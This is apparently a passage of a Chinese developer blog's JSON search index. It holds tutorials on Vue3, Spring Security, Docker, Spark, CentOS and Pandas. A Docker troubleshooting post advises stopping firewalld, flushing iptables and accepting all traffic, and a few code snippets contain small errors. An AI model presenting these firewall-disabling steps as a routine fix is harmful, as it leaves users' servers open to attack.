computed:&#123; sum:&#123; get()&#123; return this.num1 * this.num2 &#125;, set(value)&#123; this.num1 = value / 2 this.num2 = value / 3 &#125; &#125; &#125;&#125;&lt;/script&gt;","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"},{"name":"Vue3","slug":"Vue3","permalink":"https://bestflyteng.github.io/tags/Vue3/"},{"name":"Computed","slug":"Computed","permalink":"https://bestflyteng.github.io/tags/Computed/"}]},{"title":"JS 判断数据类型","slug":"202502131053","date":"2025-02-13T02:53:33.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/e001cad0/","permalink":"https://bestflyteng.github.io/posts/e001cad0/","excerpt":"","text":"123456789// typeof 操作符可以返回一个值的类型。对于对象（包括数组和 null），typeof 会返回 &quot;object&quot;，但它不能区分数组和对象，因此需要额外判断。typeof value// 返回 [object Type]，value可以是任意值Object.prototype.toString.call(value)// instanceof 运算符可以判断一个对象是否是某个构造函数的实例。如果需要判断一个对象是否是 Object 类型的实例，可以使用 instanceof Object。// 需要注意，instanceof 对数组和对象都会返回 true，因此需要 value !== null 排除 null。value instanceof Constructor","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"}]},{"title":"Vue3 定义和使用 Porps","slug":"202502131026","date":"2025-02-13T02:27:20.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/9245de08/","permalink":"https://bestflyteng.github.io/posts/9245de08/","excerpt":"","text":"1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div&gt; &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt; &lt;p&gt;&#123;&#123; description &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup&gt;import &#123; defineProps &#125; from &#x27;vue&#x27;// 定义 Props，在 setup 中props是自动解构的，不需要通过 props.title 来访问defineProps(&#123; title: &#123; // 定义 props 的数据类型 type: string, // required 标明这个 prop 是必传的，属性是可选的，默认为 false， required: true, validator(value)&#123; // 自定义校验函数，返回 true 表示校验通过，返回 false 表示校验失败 return [&#x27;success&#x27;, &#x27;warning&#x27;, &#x27;danger&#x27;].includes(value) &#125; &#125;, description: &#123; type: String, // 为 prop 提供默认值 default: &#x27;Default description&#x27; &#125;&#125;)&lt;/script&gt;","categories":[],"tags":[{"name":"Vue3","slug":"Vue3","permalink":"https://bestflyteng.github.io/tags/Vue3/"},{"name":"Props","slug":"Props","permalink":"https://bestflyteng.github.io/tags/Props/"}]},{"title":"JS DOM 创建与获取","slug":"202502121507","date":"2025-02-12T07:07:57.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/16e4e576/","permalink":"https://bestflyteng.github.io/posts/16e4e576/","excerpt":"","text":"创建节点 12// 创建一个元素节点，参数为标签名ele.createElement(&quot;p&quot;) 创建文本节点 12// 创建一个文本节点，参数为文本内容ele.createTextNode(&quot;文本内容&quot;) 在元素内部的末尾添加节点 12// 在元素内部的末尾添加节点，参数为要添加的节点ele.appendChild(node) 在元素内部的末尾添加内容或节点 12// args 参数可以是 DOM 节点、DOM 节点数组、HTML 字符串、文本字符串ele.append(...args) 在元素内，将节点添加到指定节点之前，返回添加的子节点 12// 如果给定的节点已经存在于文档中， 会将其从当前位置移动到新位置。（也就是说，它会在附加到指定的新父节点之前自动从现有的父节点中移除。）这意味着一个节点不能同时存在于文档的两个位置。ele.insertBefore(newNode, node); 删除节点 12// 删除 ele 节点，包括其子节点ele.remove() 删除子节点 1ele.removeChild(childNode); 替换节点 1ele.replaceChild(newNode, oldNode); 克隆节点 12// 参数为 true，则执行深拷贝，复制节点及其子节点；参数为 false，则执行浅拷贝，只复制节点本身，不复制子节点。(默认为false)ele.cloneNode(deep); 获取父节点 1ele.parentNode 找到最近的指定父节点 1ele.closest(&quot;selector&quot;) 获取节点 12345678910// 获取元素节点，参数为id名ele.getElementById(&quot;id&quot;)// 获取元素节点，参数为class名ele.getElementsByClassName(&quot;class&quot;)// 获取元素节点，参数为标签名ele.getElementsByTagName(&quot;tag&quot;)// 获取元素节点，参数为任何选择器ele.querySelector(&quot;selector&quot;)// 获取元素节点，参数为任何选择器ele.querySelectorAll(&quot;selector&quot;)","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"}]},{"title":"JS 用 Set 实现 交集、并集、差集","slug":"202502121335","date":"2025-02-12T05:36:24.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/4cafe26/","permalink":"https://bestflyteng.github.io/posts/4cafe26/","excerpt":"","text":"1234567891011121314let a = new Set([1, 2, 3]);let b = new Set([4, 3, 2]);// 交集let intersect = new Set([...a].filter(x =&gt; b.has(x)));// set &#123;2, 3&#125;// 并集let union = new Set([...a, ...b]);// Set &#123;1, 2, 3, 4&#125;// 差集let difference = new Set([...a].filter(x =&gt; !b.has(x)));// Set &#123;1&#125;","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"}]},{"title":"Spring Boot 3.4.1 + Spring security 6.4.2 重写登录","slug":"202502090917","date":"2025-02-09T01:18:44.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/86d63d83/","permalink":"https://bestflyteng.github.io/posts/86d63d83/","excerpt":"","text":"依赖引入 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.4.1&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-jsqlparser-4.9&lt;/artifactId&gt; &lt;version&gt;3.5.10.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-spring-boot3-starter&lt;/artifactId&gt; &lt;version&gt;3.5.10.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter-test&lt;/artifactId&gt; &lt;version&gt;3.5.10.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.yulichang&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-join-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.5.2&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 编写数据表实体类 1234567891011121314151617@NoArgsConstructor@AllArgsConstructor@Datapublic class User &#123; @TableId(type = IdType.ASSIGN_ID) private Long id; private String name; @NotBlank @Email private String email; @NotBlank private String password; private String persona; private String enabled; private String avatar; private LocalDateTime createTime;&#125; 编写 UserDetails 的实现类 12345678910111213141516171819202122232425262728293031323334353637383940414243@Data@NoArgsConstructor@AllArgsConstructorpublic class UserLogin implements UserDetails &#123; private User user; @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() &#123; return List.of(new SimpleGrantedAuthority(&quot;ROLE_&quot; + user.getPersona())); &#125; @Override public String getPassword() &#123; return user.getPassword(); &#125; @Override public String getUsername() &#123; // 使用邮箱登录 return user.getEmail(); &#125; @Override public boolean isAccountNonExpired() &#123; return UserDetails.super.isAccountNonExpired(); &#125; @Override public boolean isAccountNonLocked() &#123; return UserDetails.super.isAccountNonLocked(); &#125; @Override public boolean isCredentialsNonExpired() &#123; return UserDetails.super.isCredentialsNonExpired(); &#125; @Override public boolean isEnabled() &#123; // 使用1表示启用，0表示禁用 return &quot;1&quot;.equals(user.getEnabled()); &#125;&#125; 编写 UserMapper 接口 123@Mapperpublic interface UserMapper extends MPJBaseMapper&lt;User&gt; &#123;&#125; 编写 UserDetailsService 的实现类 1234567891011121314151617181920@Servicepublic class UserDetailsServiceImpl implements UserDetailsService &#123; @Resource private UserMapper userMapper; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException &#123; //查询用户信息 LambdaQueryWrapper&lt;User&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(User::getEmail, username); User user = userMapper.selectOne(queryWrapper); //如果没有查询到用户，就抛出异常 if (Objects.isNull(user)) &#123; throw new BadCredentialsException(&quot;用户名或者密码错误！&quot;); &#125; //将数据封装成UserDetails return new UserLogin(user); &#125;&#125; 编写自定义控制器 1234567891011@RestController@RequestMapping(&quot;/user&quot;)public class UserController &#123; @Resource private IUserService userService; @PostMapping(&quot;/login&quot;) public Map&lt;String, String&gt; login(@RequestBody @Validated User user) &#123; return userService.login(user); &#125;&#125; 编写 userServiceImpl 实现类 123456789101112public Map&lt;String, String&gt; login(User user) &#123; // 进行用户认证，用邮箱作为用户名登陆 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(user.getEmail(), user.getPassword()); Authentication authenticate = authenticationManager.authenticate(authenticationToken); //通过了，生成jwt UserLogin loginUser = (UserLogin) authenticate.getPrincipal(); // 可以选择存放在redis ...... Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); // 将token返回给前端 map.put(&quot;token&quot;, token); return map;&#125;","categories":[],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://bestflyteng.github.io/tags/Spring/"},{"name":"Spring security","slug":"Spring-security","permalink":"https://bestflyteng.github.io/tags/Spring-security/"}]},{"title":"docker 部署 nginx","slug":"202502071354","date":"2025-02-07T05:55:00.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/837c427b/","permalink":"https://bestflyteng.github.io/posts/837c427b/","excerpt":"","text":"1. 拉取 nginx 镜像 1docker pull nginx 2. 运行容器 这里我映射到了本地的9000端口，可以根据需要修改 1docker run --name nginx -p 9000:80 -d nginx 3. 浏览器访问 浏览器访问 http://ip:9000，如果看到下图则表示 nginx 部署成功","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://bestflyteng.github.io/tags/docker/"},{"name":"nginx","slug":"nginx","permalink":"https://bestflyteng.github.io/tags/nginx/"}]},{"title":"Vue3 + Element Plus 自定义验证","slug":"202501251533","date":"2025-01-25T07:34:26.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/f5b25be3/","permalink":"https://bestflyteng.github.io/posts/f5b25be3/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import type &#123;FormInstance, FormRules&#125; from &#x27;element-plus&#x27;// 判断是否是移动端的函数import &#123;isMobileDevice&#125; from &quot;@/utils/commonMethod&quot;;// 定义表单数据类型interface RuleForm &#123; name: string password: string confirmPassword: string email: string code: string&#125;// 获取表单实例，常量名对应ref属性const ruleFormRef = ref&lt;FormInstance&gt;()// 以下两个 validate* 函数，必须调用回调函数，否则最后提交会卡住// 定义验证确认密码函数const validatePass = (rule: object, value: string, callback: (error?: Error) =&gt; void) =&gt; &#123; if (value !== form.password) &#123; callback(new Error(&quot;两次密码不一致&quot;)) &#125; else &#123; callback() &#125;&#125;// 定义验证邮箱函数const validateEmail = (rule: object, value: string, callback: (error?: Error) =&gt; void) =&gt; &#123; const reg = /^[A-Za-z0-9_\\-]+(\\.[A-Za-z0-9_\\-]+)*@[A-Za-z0-9\\-]+\\.[A-Za-z]&#123;2,&#125;$/ if (!reg.test(value)) &#123; callback(new Error(&quot;邮箱不合法&quot;)) &#125; else &#123; callback() &#125;&#125;// 定义表单数据const form = reactive&lt;RuleForm&gt;(&#123; name: &#x27;&#x27;, password: &#x27;&#x27;, confirmPassword: &#x27;&#x27;, email: &#x27;&#x27;, code: &#x27;&#x27;&#125;)// 定义表单验证规则const rules = reactive&lt;FormRules&lt;RuleForm&gt;&gt;(&#123; name: [ &#123;required: true, message: &#x27;请输入昵称&#x27;, trigger: &#x27;blur&#x27;&#125;, &#123;min: 1, max: 20, message: &#x27;长度应是1-20&#x27;, trigger: &#x27;blur&#x27;&#125;, ], email: [ &#123;required: true, message: &#x27;请输入邮箱&#x27;, trigger: &#x27;blur&#x27;&#125;, &#123;validator: validateEmail, trigger: &#x27;blur&#x27;&#125;, ], code: [ &#123;required: true, message: &#x27;请输入邮箱验证码&#x27;, trigger: &#x27;blur&#x27;&#125;, &#123;min: 6, max: 6, message: &#x27;长度应是6&#x27;, trigger: &#x27;blur&#x27;&#125;, ], password: [ &#123;required: true, message: &#x27;请输入密码&#x27;, trigger: &#x27;blur&#x27;&#125;, &#123;min: 8, max: 16, message: &#x27;长度应是8-16&#x27;, trigger: &#x27;blur&#x27;&#125;, ], confirmPassword: [ &#123;required: true, message: &#x27;请确认密码&#x27;, trigger: &#x27;blur&#x27;&#125;, &#123;validator: validatePass, trigger: &#x27;blur&#x27;&#125; ]&#125;)// 提交表单const submitForm = (formEl: FormInstance | undefined) =&gt; &#123; if (!formEl) return// 如果上面的两个 validate* 函数没有调用回调函数，则这里会卡住 formEl.validate((valid) =&gt; &#123; console.log(valid) &#125;)&#125;// 重置表单const resetForm = (formEl: FormInstance | undefined) =&gt; &#123; if (!formEl) return formEl.resetFields()&#125;const timer = ref(0)const show = ref(true)const count = ref(0)const time = 120const getCode = () =&gt; &#123; //axios请求 console.log(form.email); // 验证码倒计时 if (timer.value === 0) &#123; count.value = time; show.value = false; timer.value = setInterval(() =&gt; &#123; if (count.value &gt; 0 &amp;&amp; count.value &lt;= time) &#123; count.value--; &#125; else &#123; show.value = true; clearInterval(timer.value); timer.value = 0; &#125; &#125;, 1000); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div class=&quot;registry&quot; :style=&quot;&#123;width: isMobileDevice() ? &#x27;90%&#x27; : &#x27;50%&#x27;&#125;&quot;&gt; &lt;span&gt;注册&lt;/span&gt; &lt;el-form :ref=&quot;ruleFormRef&quot; :model=&quot;form&quot; :rules=&quot;rules&quot; label-width=&quot;auto&quot; class=&quot;demo-ruleForm&quot; size=&quot;default&quot; status-icon&gt; &lt;el-form-item label=&quot;昵称&quot; prop=&quot;name&quot;&gt; &lt;el-input v-model=&quot;form.name&quot;/&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;邮箱&quot; prop=&quot;email&quot;&gt; &lt;el-input v-model=&quot;form.email&quot;/&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;验证码&quot; prop=&quot;code&quot;&gt; &lt;el-input v-model=&quot;form.code&quot; style=&quot;flex:10;&quot;/&gt; &lt;el-button type=&quot;success&quot; @click=&quot;getCode&quot; round style=&quot;flex: 1;margin: 0 0 0 1rem&quot;&gt; &lt;span v-show=&quot;show&quot;&gt;发送验证码&lt;/span&gt; &lt;span v-show=&quot;!show&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/span&gt; &lt;/el-button&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot;&gt; &lt;el-input type=&quot;password&quot; v-model=&quot;form.password&quot;/&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;确认密码&quot; prop=&quot;confirmPassword&quot;&gt; &lt;el-input type=&quot;password&quot; v-model=&quot;form.confirmPassword&quot;/&gt; &lt;/el-form-item&gt; &lt;el-form-item&gt; &lt;el-button type=&quot;success&quot; @click=&quot;submitForm(ruleFormRef)&quot;&gt;Submit&lt;/el-button&gt; &lt;el-button @click=&quot;resetForm(ruleFormRef)&quot;&gt;Reset&lt;/el-button&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; &lt;/div&gt;&lt;/template&gt;","categories":[],"tags":[]},{"title":"安装并使用 GitStack","slug":"202412151508","date":"2024-12-15T07:08:51.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/7baecab0/","permalink":"https://bestflyteng.github.io/posts/7baecab0/","excerpt":"","text":"下载 GitStack 下载地址 安装 GitStack 下载完成后，双击运行 GitStackSetup.exe 文件，点击 Next。 点击 I Agree。 选择安装位置，点击 Next。 画红框的必须全选，不然会出一些意想不到的错误，而后点击 Install 如果选择了Launch GitStack选项，那么点击Finish后会自动打开GitStack的管理页面。安装完成后，点击 Finish。 使用 GitStack 打开浏览器，输入http://localhost/gitstack，跳转到以下页面，默认用户名密码是admin/admin，点击Sign In登录。 登录成功后，可以在这里添加一个新的仓库，输入新仓库的名称(字母和数字组合)，而后点击Create。","categories":[],"tags":[{"name":"GitStack","slug":"GitStack","permalink":"https://bestflyteng.github.io/tags/GitStack/"},{"name":"Git","slug":"Git","permalink":"https://bestflyteng.github.io/tags/Git/"}]},{"title":"Spark Sql 常用函数 (Scala 语言)","slug":"202411251836","date":"2024-11-25T10:36:22.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/eca3873f/","permalink":"https://bestflyteng.github.io/posts/eca3873f/","excerpt":"","text":"基于 org.apache.spark.sql.functions._ 包下的函数 col 用于在DataFrame或Dataset中引用列，通常与Spark的SQL查询或者DataFrame操作一起使用。 语法： 1col(colName: String): Column column 与 col 函数功能相同。 lit 用于将一个常量值转换为 Column 类型，以便在 Spark SQL 操作中使用。 1lit(literal: Any): Column typeLit typedLit 函数是一个类型安全的版本的 lit 函数。它用于将字面量（常量）转换为指定类型的 Column，并确保在编译时类型匹配。typedLit 适用于 Spark 3.x 版本，提供比 lit 更严格的类型检查，从而避免潜在的类型不匹配问题。 1typedLit[T: TypeTag](literal: T): Column greatest 用于比较多列的值，返回每行中这些列中的最大值。 12greatest(exprs: Column*): Columngreatest(columnName: String, columnNames: String*): Column current_date 返回当前的日期（以 yyyy-MM-dd 格式表示）。 1current_date(): Column date_sub 用于从指定的日期中减去给定的天数，并返回新的日期。 1date_sub(start: Column, days: Int): Column date_format 用于将日期类型的数据格式化为指定的字符串格式。 1date_format(dateExpr: Column, format: String): Column when 条件表达式，通常与 otherwise() 函数一起使用，用于根据条件返回不同的值。 12when(condition: Column, value: Any): Column .otherwise(value: Any): Column max 它通常用于对数值型数据进行分组聚合，或者在没有分组时返回整个列的最大值。 1max(e: Column): Column to_timestamp 将一个字符串或者日期列转换为 timestamp 类型。 12to_timestamp(s: Column): Columnto_timestamp(s: Column, fmt: String): Column row_number 用于为每个分组中的行分配一个唯一的递增整数值。它通常与窗口函数一起使用，以实现更复杂的分组和排序操作。 以下示例是基于 id 列进行分组，并按照 time 列进行降序排序，为每个分组中的行分配一个唯一的行号。 123456row_number() .over( Window .partitionBy(&quot;id&quot;) .orderBy(desc(&quot;time&quot;)) )","categories":[],"tags":[{"name":"Spark","slug":"Spark","permalink":"https://bestflyteng.github.io/tags/Spark/"},{"name":"Scala","slug":"Scala","permalink":"https://bestflyteng.github.io/tags/Scala/"}]},{"title":"Spark 增量抽取 (Scala 实现)","slug":"202411232112","date":"2024-11-23T13:13:14.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/98adaf32/","permalink":"https://bestflyteng.github.io/posts/98adaf32/","excerpt":"","text":"题目 编写Scala代码，使用Spark将MySQL的shtd_store库中表user_info、sku_info、base_province、base_region、order_info、order_detail的数据增量抽取到Hive的ods库中对应表user_info、sku_info、base_province、base_region、order_info、order_detail中。(若ods库中部分表没有数据，正常抽取即可) 第一题 1、抽取shtd_store库中user_info的增量数据进入Hive的ods库中表user_info。根据ods.user_info表中operate_time或create_time作为增量字段(即MySQL中每条数据取这两个时间中较大的那个时间作为增量字段去和ods里的这两个字段中较大的时间进行比较)，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.user_info命令。 代码 第二题 2、 抽取shtd_store库中sku_info的增量数据进入Hive的ods库中表sku_info。根据ods.sku_info表中create_time作为增量字段，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.sku_info命令。 代码","categories":[],"tags":[{"name":"Spark","slug":"Spark","permalink":"https://bestflyteng.github.io/tags/Spark/"},{"name":"Scala","slug":"Scala","permalink":"https://bestflyteng.github.io/tags/Scala/"},{"name":"大数据","slug":"大数据","permalink":"https://bestflyteng.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"docker 映射端口外部设备访问不到","slug":"202411151154","date":"2024-11-15T03:54:27.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/fa5b3dfc/","permalink":"https://bestflyteng.github.io/posts/fa5b3dfc/","excerpt":"","text":"容器内部 查看服务是否开启，以nginx为例 1ps -ef | grep nginx 返回类似于以下图片，说明服务已经启动 1systemctl stop firewalld 如果容器有防火墙，可以先关闭防火墙试一下 先查一下防火墙的状态，如果为下图就是关着呢 宿主机 先看容器是否正确映射端口 下图画红框的地方就是将容器内部的nginx服务映射到宿主机的32770端口，如果这里没有映射，那么外部设备肯定访问不到。 查看宿主机端口是否开启 1ss -tlnp | grep 32770 类似于以下输出，说明端口没问题 如果还是访问不了，那么就是防火墙的问题了，可以尝试关闭防火墙。 1systemctl stop firewalld 类似于下图就是关着呢 配置iptables使得所有流量都允许，可以通过以下命令清除当前的规则并设置允许所有的流量。 123sudo iptables -F # 清除所有链中的规则sudo iptables -X # 删除所有自定义链sudo iptables -Z # 清空规则链中的计数器 设置默认链为 ACCEPT，表示允许所有的传入、传出流量。执行以下命令： 123sudo iptables -P INPUT ACCEPT # 允许所有进入流量sudo iptables -P FORWARD ACCEPT # 允许所有转发流量sudo iptables -P OUTPUT ACCEPT # 允许所有输出流量 无需重启，立刻生效 默认情况下，iptables 规则在系统重启后会丢失。 根据系统版本不同，可以上网搜索对应的方法，将iptables规则保存下来，防止重启后失效。 容器内部 外部设备访问 http://宿主机:映射的端口 如果是以下页面，说明连接没问题，大概率是内部服务或代理的问题 我这里是后端的jar包端口映射错了，需要改运行的端口为8080 直接用命令复制jar包到宿主机再复制到本地windows电脑下 1docker cp b634d0b5d430:/root/question-1.0.jar ./ 然后用解压工具打开question-1.0.jar，修改 BOOT-INF\\classes\\目录下的application.yml文件 再复制回docker中，重新运行jar包 1docker cp ./question-1.0.jar b634d0b5d430:/root/question-1.0.jar 先查看之前运行的任务，然后结束他 结束之后重新运行，因为之前已经复制jar包到容器中，所以直接运行就OK 这里的 nohup command &amp; 是让jar包在后台运行 运行后可以看一下 nohup 的日志文件看看运行成功没有，这样是运行成功了。","categories":[],"tags":[]},{"title":"CentOS 7 配置 IP 地址","slug":"202410301643","date":"2024-10-30T08:43:24.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/57182686/","permalink":"https://bestflyteng.github.io/posts/57182686/","excerpt":"","text":"切换至特权模式，并输入密码 1su root 查看网卡信息 1ip a 修改网卡配置文件 123456789vim /etc/sysconfig/network-scripts/ifcfg-ens33 //进入网卡ens33的配置页面i //输i进入文件编辑模式(i=insert)BOOTPROTO=&quot;dhcp&quot; //修改：将dhcp修改为static，修改后为BOOTPROTO=staticONBOOT=yes //修改为yes, 网卡开机自启动Esc或Ctrl+c //退出文件编辑模式:wq //保存文件修改并退出service network restart //重启网卡ip add //查看网卡ens33的IP地址已经变成配置的静态IP地址ping xxx.xxx.xxx.xxx //ping自己，ping网关，验证网络能通","categories":[{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/categories/Linux/"},{"name":"CentOS","slug":"Linux/CentOS","permalink":"https://bestflyteng.github.io/categories/Linux/CentOS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"},{"name":"CentOS","slug":"CentOS","permalink":"https://bestflyteng.github.io/tags/CentOS/"},{"name":"IP","slug":"IP","permalink":"https://bestflyteng.github.io/tags/IP/"}]},{"title":"Pandas 例题 - 1","slug":"202409051655","date":"2024-09-05T08:56:03.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/ef59dde3/","permalink":"https://bestflyteng.github.io/posts/ef59dde3/","excerpt":"","text":"电商订单数据清洗 任务详情 请根据系统提供的订单数据表，按要求完成以下任务： 统计订单表格中，商品描述(choice_description)中为“NaN”的数量，并将其批量替换为“banana”， 请根据以上要求，将函数 nanCount() 补充完整，函数的返回值为整数值，既为“NaN”的数量。 任务要求 订单数据表为以逗号为分隔符的csv文件，编码方式为 UTF-8； 注意：DataFrame 由后台生成，作为参数 order_data 传递到 nonCount() 中，不需要生成新的 DataFrame； DataFrame 读取为订单数据表； 返回值为 NaN 的数量，int 数据类型。 订单数据表.csv 1234567891011121314import pandas as pdclass Solution: def nanCount(self)-&gt; int: # 读取csv文件 order_data = pd.read_csv(&#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&#x27;, encoding=&#x27;utf-8&#x27;) # choice_description 为空的记录求和 nan_count = order_data[&#x27;choice_description&#x27;].isna().sum() # 将 choice_description 为空的记录填充为 banana order_data[&#x27;choice_description&#x27;].fillna(&#x27;banana&#x27;, inplace=True) # 将修改写入文件 order_data.to_csv(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&quot;, index=False, encoding=&#x27;utf-8&#x27;) # 返回 choice_description 列为空的记录数 return nan_count 电商订单数据计算 任务详情 请根据系统提供的订单数据表，按要求完成以下三个任务： 传入一个字符串，返回订单总金额 (quantity * item_price) 最大或最小的商品，并返回商品的名称(item_name)。 请根据以上要求，将函数 salesStr() 补充完整，函数的返回值为字符(str)，比如：“Steak Burrito” 订单数据访问地址请见下方： 字段名 中文含义 order_id 商品编号 quantity 数量 item_name 商品名称 choice_description 描述 item_price 单价 任务要求 传入一个字符串(‘max’ 或 ‘min’)，返回订单总金额最大或最小的商品的名称(item_name) ； 传入的字符串不区分大小写，即传入值可能是&quot;Max&quot;，也可能是&quot;max&quot;； 传入&quot;max&quot;，返回订单总金额 (quantity * item_price) 最大的商品名称；传入“min”，返回订单总金额 (quantity * item_price) 最小的商品名称； 返回字符串区分大小写，且保留字符串中间空格。 订单数据表.csv 123456789101112131415class Solution: def salesStr(self, condition: str)-&gt; str: condition = condition.lower() url = &#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/80/fj_order_data.csv&#x27; chipo = pd.read_csv(url, sep=&#x27;,&#x27;) chipo[&quot;item_price&quot;] = chipo[&quot;item_price&quot;].str.replace(&quot;$&quot;, &#x27;&#x27;, regex=False).astype(float) chipo[&quot;total_price&quot;] = chipo[&quot;quantity&quot;] * chipo[&quot;item_price&quot;] chipo_sum = chipo.groupby(&quot;item_name&quot;)[[&#x27;quantity&#x27;, &quot;item_price&quot;]].sum().reset_index() chipo_sum[&quot;total_price&quot;] = chipo_sum[&quot;quantity&quot;] * chipo_sum[&quot;item_price&quot;] result = &#x27;&#x27; if condition == &quot;max&quot;: result = chipo_sum[chipo_sum[&quot;total_price&quot;] == chipo_sum[&quot;total_price&quot;].max()][&quot;item_name&quot;].tolist()[0] elif condition == &quot;min&quot;: result = chipo_sum[chipo_sum[&quot;total_price&quot;] == chipo_sum[&quot;total_price&quot;].min()][&quot;item_name&quot;].tolist()[0] return result DataFrame计算平均值 任务详情 给定一个DataFrame对象 df，要求返回各行的平均值。 具体操作如下： 1.添加新列 ‘avg’ 用于计算各行的平均值； 2.使用数组返回新列 ‘avg’。 任务要求 1.程序接收 DataFrame 对象 df，返回结果是 list 数据类型； 2.注意：平均值需要四舍五入保留两位小数。 测试用例 输入： 0 1 2 3 4 5 6 0 24 27 7 23 25 7 21 1 16 30 8 4 26 30 8 2 18 28 7 17 17 16 25 输出： [19.14, 17.43, 18.29] 解释：首先生成新列’avg’，需要注意平均数需要四舍五入保留小数点后两位 0 1 2 3 4 5 6 avg 0 24 27 7 23 25 7 21 19.14 1 16 30 8 4 26 30 8 17.43 2 18 28 7 17 17 16 25 18.29 输入： 0 1 2 3 0 10 19 4 7 1 9 5 28 14 2 30 27 1 13 3 21 14 19 9 4 1 25 30 16 输出：[10.0, 14.0, 17.75, 15.75, 18.0] 解释：首先生成新列’avg’，其次返回’avg’列 0 1 2 3 avg 0 10 19 4 7 10.00 1 9 5 28 14 14.00 2 30 27 1 13 17.75 3 21 14 19 9 15.75 4 1 25 30 16 18.00 1234class Solution: def CalAvg(self, df: &#x27;pd.DataFrame&#x27;) -&gt; list: df[&#x27;avg&#x27;] = round(df.mean(axis=1), 2) return list(df[&#x27;avg&#x27;]) 乐高商店收入计算 题目描述 我们需要完成乐高商店的分析，请你根据指引完成以下任务： 1.使用 Pandas 读取数据； 2.去掉没有价格的数据，将销量为空的数据填充为0； 